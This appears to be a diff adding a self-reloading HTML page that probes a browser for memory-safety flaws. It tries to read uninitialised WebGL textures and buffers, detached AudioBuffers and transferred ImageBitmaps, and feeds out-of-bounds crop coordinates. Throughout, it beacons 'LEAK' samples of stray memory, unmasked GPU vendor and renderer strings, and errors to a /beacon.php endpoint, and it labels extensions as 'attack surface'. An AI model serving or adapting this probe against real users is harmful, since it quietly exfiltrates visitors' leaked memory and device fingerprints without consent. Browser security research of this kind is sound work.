@@ -1,0 +1,749 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1203 WebGL + AudioContext + ImageBitmap</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1203 — WEBGL + AUDIO + IMAGEBITMAP</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<canvas id="glCanvas" width="64" height="64" style="display:none"></canvas>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function addFind(t){FD.textContent=t;}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1203-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+(function run(){
+var STAGES=[
+  'detect',
+  'webglUninit',       /* WebGL readPixels uninitialized memory */
+  'webglFeedback',     /* Transform feedback buffer races */
+  'webglCompressedTex',/* Compressed texture with wrong size */
+  'audioBufferRead',   /* AudioBuffer getChannelData after neutering */
+  'audioWorklet',      /* AudioWorklet availability */
+  'imgBitmapTransfer', /* ImageBitmap transfer + use-after */
+  'imgBitmapCrop',     /* ImageBitmap cropping with OOB coords */
+  'canvasToBlob',      /* Canvas toBlob timing */
+  'offscreenCanvas',   /* OffscreenCanvas + transfer */
+  'webglExtensions'    /* WebGL extension enumeration for attack surface */
+];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1203_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1203_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+(STAGES.length-1)+' — '+(STAGES[stage]||'done'));
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  var summary=JSON.stringify(results).slice(0,800);
+  B('ALL-DONE',summary);
+  log('=== ALL STAGES COMPLETE ===','ok');
+  addFind(summary);
+  try{localStorage.removeItem('p1203_stage');localStorage.removeItem('p1203_res');}catch(e){}
+  return;
+}
+try{localStorage.setItem('p1203_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+function done(rep){
+  results.push({s:stage,n:cur,r:rep});
+  try{localStorage.setItem('p1203_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','['+cur+']'+rep.slice(0,600));
+  addFind(cur+': '+rep.slice(0,300));
+  setStatus(rep.slice(0,80));
+  log('=== '+cur+' -> '+rep+' ===','ok');
+  B('NEXT','stage='+(stage+1));
+  setTimeout(function(){location.reload(true);},600);
+}
+
+/* ---- detect ---- */
+if(cur==='detect'){
+  setPhase('Feature detection');
+  var info=[];
+  var c=document.getElementById('glCanvas');
+  var gl=null;
+  try{gl=c.getContext('webgl2');}catch(e){}
+  if(!gl) try{gl=c.getContext('webgl');}catch(e){}
+  info.push('WebGL='+(gl?((gl instanceof WebGL2RenderingContext)?'2':'1'):'NO'));
+  if(gl){
+    info.push('vendor='+gl.getParameter(gl.VENDOR));
+    info.push('renderer='+gl.getParameter(gl.RENDERER));
+    info.push('version='+gl.getParameter(gl.VERSION));
+  }
+  info.push('AudioCtx='+(typeof AudioContext!=='undefined'?'YES':(typeof webkitAudioContext!=='undefined'?'webkit':'NO')));
+  info.push('ImageBitmap='+(typeof createImageBitmap));
+  info.push('OffscreenCanvas='+(typeof OffscreenCanvas));
+  try{var oc=new OffscreenCanvas(1,1);info.push('OSC_works=YES');}
+  catch(e){info.push('OSC_works=NO');}
+  info.push('AudioWorklet='+(typeof AudioWorkletNode));
+  done(info.join('|'));
+
+/* ---- webglUninit ---- */
+}else if(cur==='webglUninit'){
+  setPhase('WebGL readPixels uninitialized memory');
+  B('ATTEMPT','webglUninit');
+  var rep='',anomalies=0;
+
+  try{
+    var c=document.getElementById('glCanvas');
+    var gl=c.getContext('webgl2')||c.getContext('webgl');
+    if(!gl){done('WebGL=NO');return;}
+
+    /* Create framebuffer with texture, don't clear, read pixels */
+    var fb=gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER,fb);
+
+    var tex=gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D,tex);
+    gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,64,64,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tex,0);
+
+    var status=gl.checkFramebufferStatus(gl.FRAMEBUFFER);
+    rep='fbStatus=0x'+status.toString(16);
+
+    if(status===gl.FRAMEBUFFER_COMPLETE){
+      /* Read without clearing — should be zeros per spec */
+      var pixels=new Uint8Array(64*64*4);
+      gl.readPixels(0,0,64,64,gl.RGBA,gl.UNSIGNED_BYTE,pixels);
+
+      var nonZero=0;
+      for(var pi=0;pi<pixels.length;pi++){
+        if(pixels[pi]!==0) nonZero++;
+      }
+      rep+='|nonZero='+nonZero;
+
+      if(nonZero>0){
+        anomalies++;
+        /* Dump first few nonzero values */
+        var sample=[];
+        for(var si=0;si<pixels.length&&sample.length<20;si++){
+          if(pixels[si]!==0) sample.push(si+':'+pixels[si]);
+        }
+        B('ANOMALY','uninit-pixels|count='+nonZero+'|sample='+sample.join(','));
+        rep+='|LEAK:'+sample.join(',').slice(0,100);
+      }
+
+      /* Repeat with different texture sizes to stress allocator */
+      var sizes=[128,256,512,1024];
+      for(var si2=0;si2<sizes.length;si2++){
+        var sz=sizes[si2];
+        try{
+          var tex2=gl.createTexture();
+          gl.bindTexture(gl.TEXTURE_2D,tex2);
+          gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,sz,sz,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+          gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tex2,0);
+
+          if(gl.checkFramebufferStatus(gl.FRAMEBUFFER)===gl.FRAMEBUFFER_COMPLETE){
+            var pix2=new Uint8Array(sz*sz*4);
+            gl.readPixels(0,0,sz,sz,gl.RGBA,gl.UNSIGNED_BYTE,pix2);
+            var nz2=0;
+            for(var pi2=0;pi2<pix2.length;pi2++){
+              if(pix2[pi2]!==0) nz2++;
+            }
+            rep+='|'+sz+'x:nz='+nz2;
+            if(nz2>0){
+              anomalies++;
+              B('ANOMALY','uninit-'+sz+'|nz='+nz2);
+            }
+          }
+          gl.deleteTexture(tex2);
+        }catch(e){}
+      }
+    }
+
+    gl.deleteFramebuffer(fb);
+    gl.deleteTexture(tex);
+    rep+='|anomalies='+anomalies;
+  }catch(e){rep='THROW:'+e.message;}
+  done(rep);
+
+/* ---- webglFeedback ---- */
+}else if(cur==='webglFeedback'){
+  setPhase('WebGL2 transform feedback');
+  B('ATTEMPT','webglFeedback');
+  var rep2='';
+
+  try{
+    var c=document.getElementById('glCanvas');
+    var gl2=c.getContext('webgl2');
+    if(!gl2){done('WebGL2=NO');return;}
+
+    /* Transform feedback writes GPU results to a buffer.
+       If we can read that buffer before clear, might get stale GPU data */
+    var tfBuf=gl2.createBuffer();
+    gl2.bindBuffer(gl2.TRANSFORM_FEEDBACK_BUFFER,tfBuf);
+    gl2.bufferData(gl2.TRANSFORM_FEEDBACK_BUFFER,256,gl2.DYNAMIC_COPY);
+
+    /* Read back uninitialized buffer */
+    var readBuf=new Float32Array(64);
+    gl2.getBufferSubData(gl2.TRANSFORM_FEEDBACK_BUFFER,0,readBuf);
+
+    var nonZeroTF=0;
+    for(var ti=0;ti<readBuf.length;ti++){
+      if(readBuf[ti]!==0) nonZeroTF++;
+    }
+    rep2='tfBuf:nz='+nonZeroTF;
+
+    if(nonZeroTF>0){
+      var sample2=[];
+      for(var ti2=0;ti2<readBuf.length&&sample2.length<10;ti2++){
+        if(readBuf[ti2]!==0) sample2.push(ti2+':'+readBuf[ti2]);
+      }
+      B('ANOMALY','tf-uninit|count='+nonZeroTF+'|sample='+sample2.join(','));
+      rep2+='|LEAK:'+sample2.join(',').slice(0,80);
+    }
+
+    /* Try various buffer types for uninitialized reads */
+    var bufTypes=[
+      {name:'ARRAY',t:gl2.ARRAY_BUFFER},
+      {name:'ELEMENT',t:gl2.ELEMENT_ARRAY_BUFFER},
+      {name:'UNIFORM',t:gl2.UNIFORM_BUFFER},
+      {name:'PIXEL_PACK',t:gl2.PIXEL_PACK_BUFFER}
+    ];
+
+    for(var bt=0;bt<bufTypes.length;bt++){
+      try{
+        var buf=gl2.createBuffer();
+        gl2.bindBuffer(bufTypes[bt].t,buf);
+        gl2.bufferData(bufTypes[bt].t,1024,gl2.DYNAMIC_READ);
+
+        /* Can't getBufferSubData from PIXEL_PACK directly — need different approach */
+        if(bufTypes[bt].name!=='PIXEL_PACK'){
+          var rd=new Uint8Array(1024);
+          gl2.getBufferSubData(bufTypes[bt].t,0,rd);
+          var nzB=0;
+          for(var bi=0;bi<rd.length;bi++){if(rd[bi]!==0) nzB++;}
+          rep2+='|'+bufTypes[bt].name+':nz='+nzB;
+          if(nzB>0) B('ANOMALY',bufTypes[bt].name+'-uninit|nz='+nzB);
+        }
+        gl2.deleteBuffer(buf);
+      }catch(e){
+        rep2+='|'+bufTypes[bt].name+':ERR';
+      }
+    }
+  }catch(e){rep2='THROW:'+e.message;}
+  done(rep2);
+
+/* ---- webglCompressedTex ---- */
+}else if(cur==='webglCompressedTex'){
+  setPhase('WebGL compressed texture edge cases');
+  B('ATTEMPT','webglCompressedTex');
+  var rep3='';
+
+  try{
+    var c=document.getElementById('glCanvas');
+    var gl3=c.getContext('webgl2')||c.getContext('webgl');
+    if(!gl3){done('WebGL=NO');return;}
+
+    /* List compressed texture extensions */
+    var exts=gl3.getSupportedExtensions()||[];
+    var compExts=exts.filter(function(e){return e.indexOf('compressed')>=0||e.indexOf('ASTC')>=0||e.indexOf('ETC')>=0||e.indexOf('S3TC')>=0;});
+    rep3='compExts='+compExts.length+'['+compExts.join(',').slice(0,100)+']';
+
+    /* Try to upload compressed data with wrong sizes */
+    for(var ei=0;ei<compExts.length;ei++){
+      try{
+        var ext=gl3.getExtension(compExts[ei]);
+        if(!ext) continue;
+
+        /* Try formats from extension */
+        var formats=gl3.getParameter(gl3.COMPRESSED_TEXTURE_FORMATS)||[];
+        rep3+='|fmts='+formats.length;
+
+        for(var fi=0;fi<Math.min(formats.length,3);fi++){
+          try{
+            var tex3=gl3.createTexture();
+            gl3.bindTexture(gl3.TEXTURE_2D,tex3);
+            /* Upload compressed data with mismatched size */
+            var badData=new Uint8Array(1024);
+            for(var bdi=0;bdi<1024;bdi++) badData[bdi]=0xAA;
+            gl3.compressedTexImage2D(gl3.TEXTURE_2D,0,formats[fi],64,64,0,badData);
+            var err=gl3.getError();
+            rep3+='|fmt'+fi+'=0x'+formats[fi].toString(16)+'|err=0x'+err.toString(16);
+            gl3.deleteTexture(tex3);
+          }catch(e){}
+        }
+      }catch(e){}
+    }
+  }catch(e){rep3='THROW:'+e.message;}
+  done(rep3);
+
+/* ---- audioBufferRead ---- */
+}else if(cur==='audioBufferRead'){
+  setPhase('AudioBuffer after neutering');
+  B('ATTEMPT','audioBufferRead');
+  var rep4='',anomalies4=0;
+
+  try{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    if(!AC){done('AudioCtx=NO');return;}
+
+    var ctx=new AC();
+    rep4='sampleRate='+ctx.sampleRate+'|state='+ctx.state;
+
+    /* Create audio buffer with known data */
+    var abuf=ctx.createBuffer(2,4096,ctx.sampleRate);
+    var ch0=abuf.getChannelData(0);
+    var ch1=abuf.getChannelData(1);
+    for(var ai=0;ai<4096;ai++){
+      ch0[ai]=Math.sin(ai*0.1);
+      ch1[ai]=Math.cos(ai*0.1);
+    }
+
+    /* Get channel data reference, then try to neuter the buffer */
+    var ref0=abuf.getChannelData(0);
+
+    /* Try transferring the underlying Float32Array */
+    try{
+      var cloned=structuredClone(ref0.buffer,{transfer:[ref0.buffer]});
+      /* If this works, ref0 is detached but abuf still references it */
+      try{
+        var afterVal=ref0[0]; /* Read from detached */
+        rep4+='|detachRead='+(afterVal===undefined?'undef':'val:'+afterVal);
+        if(afterVal!==undefined&&!isNaN(afterVal)){
+          anomalies4++;
+          B('ANOMALY','abuf-detach-read|val='+afterVal);
+        }
+      }catch(e){
+        rep4+='|detachRead:'+e.constructor.name;
+      }
+
+      /* Can we still get channel data from the AudioBuffer? */
+      try{
+        var ch0b=abuf.getChannelData(0);
+        rep4+='|reget:len='+ch0b.length;
+        if(ch0b.length>0&&ch0b[0]!==0){
+          rep4+='|regetV='+ch0b[0].toFixed(4);
+        }
+      }catch(e){
+        rep4+='|reget:'+e.constructor.name;
+      }
+    }catch(e){
+      rep4+='|transfer:'+e.message.slice(0,30);
+    }
+
+    /* Create many small buffers to stress allocator */
+    var bufs=[];
+    for(var bi=0;bi<200;bi++){
+      try{
+        bufs.push(ctx.createBuffer(1,128,ctx.sampleRate));
+      }catch(e){break;}
+    }
+    rep4+='|created='+bufs.length;
+
+    /* Read all channel data */
+    var allOk=true;
+    for(var ci=0;ci<bufs.length;ci++){
+      var cd=bufs[ci].getChannelData(0);
+      for(var di=0;di<cd.length;di++){
+        if(cd[di]!==0){allOk=false;break;}
+      }
+      if(!allOk) break;
+    }
+    rep4+='|initZero='+allOk;
+    if(!allOk){
+      anomalies4++;
+      B('ANOMALY','abuf-uninit');
+    }
+
+    ctx.close();
+    rep4+='|anomalies='+anomalies4;
+  }catch(e){rep4='THROW:'+e.message;}
+  done(rep4);
+
+/* ---- audioWorklet ---- */
+}else if(cur==='audioWorklet'){
+  setPhase('AudioWorklet availability');
+  B('ATTEMPT','audioWorklet');
+  var rep5='';
+
+  try{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    if(!AC){done('AudioCtx=NO');return;}
+    var ctx5=new AC();
+    rep5='hasWorklet='+(!!ctx5.audioWorklet);
+
+    if(ctx5.audioWorklet){
+      /* Try to add a worklet module */
+      try{
+        /* Create a blob URL as worklet source */
+        var code='class TestProcessor extends AudioWorkletProcessor{process(){return true;}}registerProcessor("test-p",TestProcessor);';
+        var blob=new Blob([code],{type:'application/javascript'});
+        var url=URL.createObjectURL(blob);
+
+        ctx5.audioWorklet.addModule(url).then(function(){
+          rep5+='|addModule=ok';
+          try{
+            var node=new AudioWorkletNode(ctx5,'test-p');
+            rep5+='|node=ok';
+            node.disconnect();
+          }catch(e){
+            rep5+='|node:'+e.message.slice(0,30);
+          }
+          URL.revokeObjectURL(url);
+          ctx5.close();
+          done(rep5);
+        }).catch(function(e){
+          rep5+='|addModule:'+e.message.slice(0,30);
+          ctx5.close();
+          done(rep5);
+        });
+        return; /* async */
+      }catch(e){
+        rep5+='|workletErr:'+e.message.slice(0,30);
+      }
+    }
+
+    /* ScriptProcessorNode (deprecated but might exist) */
+    try{
+      var sp=ctx5.createScriptProcessor(4096,1,1);
+      rep5+='|scriptProc=YES';
+      sp.disconnect();
+    }catch(e){
+      rep5+='|scriptProc:'+e.message.slice(0,20);
+    }
+
+    ctx5.close();
+  }catch(e){rep5='THROW:'+e.message;}
+  done(rep5);
+  return;
+
+/* ---- imgBitmapTransfer ---- */
+}else if(cur==='imgBitmapTransfer'){
+  setPhase('ImageBitmap transfer + use-after');
+  B('ATTEMPT','imgBitmapTransfer');
+
+  try{
+    if(typeof createImageBitmap==='undefined'){done('ImageBitmap=NO');return;}
+
+    /* Create a canvas with known pixel data */
+    var cv=document.createElement('canvas');
+    cv.width=64;cv.height=64;
+    var ctx6=cv.getContext('2d');
+    ctx6.fillStyle='#FF0000';
+    ctx6.fillRect(0,0,64,64);
+
+    createImageBitmap(cv).then(function(bmp){
+      var rep6='bmpW='+bmp.width+'|bmpH='+bmp.height;
+
+      /* Transfer the bitmap */
+      try{
+        var cloned=structuredClone(bmp,{transfer:[bmp]});
+        rep6+='|transfer=ok|srcW='+bmp.width+'|dstW='+cloned.width;
+
+        /* Use transferred (should be detached) bitmap */
+        try{
+          var cv2=document.createElement('canvas');
+          cv2.width=64;cv2.height=64;
+          var ctx6b=cv2.getContext('2d');
+          ctx6b.drawImage(bmp,0,0); /* Draw detached bitmap */
+          var pix=ctx6b.getImageData(0,0,1,1).data;
+          rep6+='|stalePixel='+pix[0]+','+pix[1]+','+pix[2]+','+pix[3];
+          if(pix[0]>0||pix[1]>0||pix[2]>0){
+            rep6+='|STALE_DRAW';
+            B('ANOMALY','bmp-stale-draw|r='+pix[0]+'|g='+pix[1]+'|b='+pix[2]);
+          }
+        }catch(e){
+          rep6+='|staleDraw:'+e.message.slice(0,30);
+        }
+
+        /* Use the valid clone */
+        try{
+          var cv3=document.createElement('canvas');
+          cv3.width=64;cv3.height=64;
+          var ctx6c=cv3.getContext('2d');
+          ctx6c.drawImage(cloned,0,0);
+          var pix2=ctx6c.getImageData(0,0,1,1).data;
+          rep6+='|clonePix='+pix2[0]+','+pix2[1]+','+pix2[2];
+        }catch(e){rep6+='|cloneDraw:ERR';}
+
+        cloned.close();
+      }catch(e){
+        rep6+='|transfer:'+e.message.slice(0,30);
+      }
+
+      done(rep6);
+    }).catch(function(e){
+      done('createBMP:'+e.message.slice(0,40));
+    });
+    return; /* async */
+  }catch(e){done('THROW:'+e.message);}
+  return;
+
+/* ---- imgBitmapCrop ---- */
+}else if(cur==='imgBitmapCrop'){
+  setPhase('ImageBitmap cropping with OOB coords');
+  B('ATTEMPT','imgBitmapCrop');
+
+  try{
+    if(typeof createImageBitmap==='undefined'){done('ImageBitmap=NO');return;}
+
+    var cv=document.createElement('canvas');
+    cv.width=32;cv.height=32;
+    var ctx7=cv.getContext('2d');
+    ctx7.fillStyle='#00FF00';
+    ctx7.fillRect(0,0,32,32);
+
+    var tests7=0,results7=[];
+    var crops=[
+      {x:-10,y:-10,w:64,h:64,desc:'neg-origin'},
+      {x:0,y:0,w:100,h:100,desc:'oversize'},
+      {x:30,y:30,w:10,h:10,desc:'partial-oob'},
+      {x:1000,y:1000,w:1,h:1,desc:'far-oob'},
+      {x:0,y:0,w:0,h:0,desc:'zero-size'},
+      {x:0,y:0,w:-1,h:-1,desc:'negative-size'}
+    ];
+
+    var completed7=0;
+    for(var ci=0;ci<crops.length;ci++){
+      (function(crop,idx){
+        try{
+          createImageBitmap(cv,crop.x,crop.y,crop.w,crop.h).then(function(bmp){
+            completed7++;
+            results7.push(crop.desc+':'+bmp.width+'x'+bmp.height);
+            bmp.close();
+            if(completed7>=crops.length){
+              done('crops='+results7.join('|')+'|tests='+completed7);
+            }
+          }).catch(function(e){
+            completed7++;
+            results7.push(crop.desc+':ERR:'+e.message.slice(0,15));
+            if(completed7>=crops.length){
+              done('crops='+results7.join('|')+'|tests='+completed7);
+            }
+          });
+        }catch(e){
+          completed7++;
+          results7.push(crop.desc+':THROW');
+          if(completed7>=crops.length){
+            done('crops='+results7.join('|')+'|tests='+completed7);
+          }
+        }
+      })(crops[ci],ci);
+    }
+
+    setTimeout(function(){
+      if(completed7<crops.length){
+        done('TIMEOUT|completed='+completed7+'|'+results7.join('|'));
+      }
+    },5000);
+    return; /* async */
+  }catch(e){done('THROW:'+e.message);}
+  return;
+
+/* ---- canvasToBlob ---- */
+}else if(cur==='canvasToBlob'){
+  setPhase('Canvas toBlob race');
+  B('ATTEMPT','canvasToBlob');
+
+  try{
+    var cv=document.createElement('canvas');
+    cv.width=256;cv.height=256;
+    var ctx8=cv.getContext('2d');
+
+    /* Draw something complex */
+    for(var gi=0;gi<100;gi++){
+      ctx8.fillStyle='rgb('+(gi*2)+','+(gi*3)+','+((gi*5)%256)+')';
+      ctx8.fillRect(gi*2,gi*2,20,20);
+    }
+
+    var blobResults=[];
+    var blobDone=0;
+    var BLOB_COUNT=10;
+
+    /* Call toBlob multiple times rapidly while modifying canvas */
+    for(var bi=0;bi<BLOB_COUNT;bi++){
+      (function(idx){
+        cv.toBlob(function(blob){
+          blobDone++;
+          if(blob){
+            blobResults.push(idx+':'+blob.size);
+          }else{
+            blobResults.push(idx+':null');
+          }
+          /* Modify canvas between callbacks */
+          ctx8.clearRect(0,0,256,256);
+          ctx8.fillStyle='#'+Math.random().toString(16).slice(2,8);
+          ctx8.fillRect(0,0,256,256);
+
+          if(blobDone>=BLOB_COUNT){
+            /* Check if blob sizes vary (they should since canvas changes) */
+            var sizes=blobResults.map(function(r){return parseInt(r.split(':')[1]);});
+            var allSame=sizes.every(function(s){return s===sizes[0];});
+            done('blobs='+blobResults.join('|')+'|allSame='+allSame);
+          }
+        },'image/png');
+      })(bi);
+    }
+
+    setTimeout(function(){
+      if(blobDone<BLOB_COUNT){
+        done('TIMEOUT|done='+blobDone+'|'+blobResults.join('|'));
+      }
+    },5000);
+    return; /* async */
+  }catch(e){done('THROW:'+e.message);}
+  return;
+
+/* ---- offscreenCanvas ---- */
+}else if(cur==='offscreenCanvas'){
+  setPhase('OffscreenCanvas + transfer');
+  B('ATTEMPT','offscreenCanvas');
+  var rep9='';
+
+  try{
+    if(typeof OffscreenCanvas==='undefined'){done('OffscreenCanvas=NO');return;}
+
+    var osc=new OffscreenCanvas(128,128);
+    var octx=osc.getContext('2d');
+    rep9='osc=ok';
+
+    if(octx){
+      octx.fillStyle='#0000FF';
+      octx.fillRect(0,0,128,128);
+
+      /* Transfer to ImageBitmap */
+      try{
+        var bmp=osc.transferToImageBitmap();
+        rep9+='|xferBmp:'+bmp.width+'x'+bmp.height;
+
+        /* Canvas should be cleared after transfer */
+        var pix=octx.getImageData(0,0,1,1).data;
+        rep9+='|afterXfer='+pix[0]+','+pix[1]+','+pix[2]+','+pix[3];
+        if(pix[2]>0){
+          rep9+='|STALE';
+          B('ANOMALY','osc-stale-after-transfer|b='+pix[2]);
+        }
+        bmp.close();
+      }catch(e){
+        rep9+='|xferBmp:'+e.message.slice(0,30);
+      }
+
+      /* Try WebGL on OffscreenCanvas */
+      try{
+        var osc2=new OffscreenCanvas(64,64);
+        var gl9=osc2.getContext('webgl');
+        rep9+='|oscGL='+(gl9?'YES':'NO');
+        if(gl9){
+          gl9.clearColor(1,0,0,1);
+          gl9.clear(gl9.COLOR_BUFFER_BIT);
+          var p9=new Uint8Array(4);
+          gl9.readPixels(0,0,1,1,gl9.RGBA,gl9.UNSIGNED_BYTE,p9);
+          rep9+='|glPix='+p9[0]+','+p9[1]+','+p9[2]+','+p9[3];
+        }
+      }catch(e){
+        rep9+='|oscGL:'+e.message.slice(0,20);
+      }
+    }else{
+      /* Try WebGL context */
+      try{
+        var glctx=osc.getContext('webgl');
+        rep9+='|2d=NO|gl='+(glctx?'YES':'NO');
+      }catch(e){rep9+='|ctxErr';}
+    }
+  }catch(e){rep9='THROW:'+e.message;}
+  done(rep9);
+
+/* ---- webglExtensions ---- */
+}else if(cur==='webglExtensions'){
+  setPhase('WebGL extension enumeration');
+  B('ATTEMPT','webglExtensions');
+  var rep10='';
+
+  try{
+    var c=document.getElementById('glCanvas');
+    var gl10=c.getContext('webgl2')||c.getContext('webgl');
+    if(!gl10){done('WebGL=NO');return;}
+
+    var exts=gl10.getSupportedExtensions()||[];
+    rep10='exts='+exts.length;
+
+    /* List all extensions */
+    B('EXTLIST',exts.join(',').slice(0,800));
+
+    /* Check for interesting attack-surface extensions */
+    var interesting=['WEBGL_debug_renderer_info','EXT_disjoint_timer_query',
+      'WEBGL_multi_draw','OES_draw_buffers_indexed','EXT_texture_norm16',
+      'WEBGL_draw_instanced_base_vertex_base_instance',
+      'WEBGL_multi_draw_instanced_base_vertex_base_instance'];
+
+    for(var ii=0;ii<interesting.length;ii++){
+      var has=exts.indexOf(interesting[ii])>=0;
+      if(has){
+        rep10+='|'+interesting[ii].replace('WEBGL_','').replace('EXT_','');
+        try{
+          var ext10=gl10.getExtension(interesting[ii]);
+          if(interesting[ii]==='WEBGL_debug_renderer_info'){
+            var uv=gl10.getParameter(ext10.UNMASKED_VENDOR_WEBGL);
+            var ur=gl10.getParameter(ext10.UNMASKED_RENDERER_WEBGL);
+            rep10+='[v='+uv+'|r='+ur+']';
+          }
+        }catch(e){}
+      }
+    }
+
+    /* WebGL limits — useful for fuzzing */
+    var limits=[
+      ['MAX_TEXTURE_SIZE',gl10.MAX_TEXTURE_SIZE],
+      ['MAX_RENDERBUFFER_SIZE',gl10.MAX_RENDERBUFFER_SIZE],
+      ['MAX_VIEWPORT_DIMS',gl10.MAX_VIEWPORT_DIMS],
+      ['MAX_VERTEX_ATTRIBS',gl10.MAX_VERTEX_ATTRIBS],
+      ['MAX_COMBINED_TEXTURE_IMAGE_UNITS',gl10.MAX_COMBINED_TEXTURE_IMAGE_UNITS]
+    ];
+    for(var li=0;li<limits.length;li++){
+      try{
+        var val=gl10.getParameter(limits[li][1]);
+        if(val instanceof Int32Array) val=val[0]+'x'+val[1];
+        rep10+='|'+limits[li][0].replace('MAX_','')+'='+val;
+      }catch(e){}
+    }
+  }catch(e){rep10='THROW:'+e.message;}
+  done(rep10);
+}
+
+})(); /* end IIFE */
+
+/* Reload poller */
+(function(){
+  var cur='P1203-webgl-audio-imgbit';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
